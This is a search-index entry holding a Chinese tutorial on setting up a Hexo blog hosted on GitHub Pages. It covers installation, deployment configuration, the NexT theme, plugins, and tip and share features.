    <title><![CDATA[搭建属于你的专属博客]]></title>
    <url>%2F2018%2F05%2F15%2Ftest%2F</url>
    <content type="text"><![CDATA[第一步：安装以及运行1.安装git以及node环境（官网下载即可）2.在node的环境下安装hexo cnpm install -g hexo-cli cnpm install -g hexo hexo -v 检验是否安装成功 3.本地创建放置博客文章文件并与github相连接 mkdir 文件夹名字 （创建文件夹） cd 文件夹名字 （进入文件夹） hexo init （初始化） cnpm install （安装依赖） 在github中新建一个仓库，注意！仓库的名字需要在后面加上’.github.io’，不要勾选readme.md，创建 在编辑器中打开上述创建的文件夹，找到最外层的配置文件_config.yml,进入文件内，搜索deploy进行如下更改，repo是我们刚才创建的github的仓库地址 deploy:type: gitrepo: https://github.com/yangxinjian/yangxinjian.github.iobranch: master 完成连接，我们可以通过push，将代码提交到github，也可以通过hexo git push origin master 也会出现Not a git repository (or any of the parent directories): .git这样的错误。这个错误代表在本地与github仓库未进行连接，解决办法如下： 在该目录下输入：git init git add . (提交代码) git commit -m ‘备注’ git remote add origin ‘你的仓库地址’ git push origin master (完成提交) npm install hexo-deployer-git –save hexo g hexo d 在这步骤可能会出现Repository not found.这个错误，这个错误出现，你就要检查一下你的仓库名字和你在配置相中写入到名字是否一致 4.开启运行 本地运行 hexo s -g 线上查看地址 https://你的仓库名字.github.io/ 第二步：配置主题以及基本文字1.配置主题 git clone https://github.com/iissnan/hexo-theme-next themes/next （克隆主题） 在最外层的配置文件中_config.yml 将theme更改为next theme: next 在themes文件夹下的next文件夹下找到主题配置文件_config scheme 分别有四个主题选项，可以随意选择，#代表注释，去掉注释代码生效，一次只可以选择一个主题 social可以增添一些其他社会信息(例如github) social:GitHub: https://github.com/yangxinjian || github avatar可以增添自己的头像(例如github) avatar: http://oqk0uz684.bkt.clouddn.com/WeChat%20Image_20180516113012.jpg pace_theme下的四个为主题动画，将其中一个设置为true，即可以开启当前动画 安装wordcount显示文章字数，在主题的config中搜索wordcount，全部设置为true cnpm install hexo-wordcount –save 安装站内搜索插件,在主题的config中搜索local-search，enable为true cnpm install hexo-generator-searchdb –save 2.基本文字基本文字在最外层的_config文件中配置，例如：标题，描述，作者等信息 title: 杨欣舰的博客 subtitle: description: 小前端的小笔记 keywords: author: Sunny Yang 3.设置打赏小功能在目录source下建立一个image文件夹用来存储支付图片 在总的_config.yml下设置支付代码 reward_comment: 坚持原创技术分享，您的支持将鼓励我继续创作！ wechatpay: /image/wechat.jpeg alipay: /image/zhifubao.jpeg 4.设置分享功能在主题的配置文件中加入 baidushare: type: button]]></content>
  </entry>
</search>
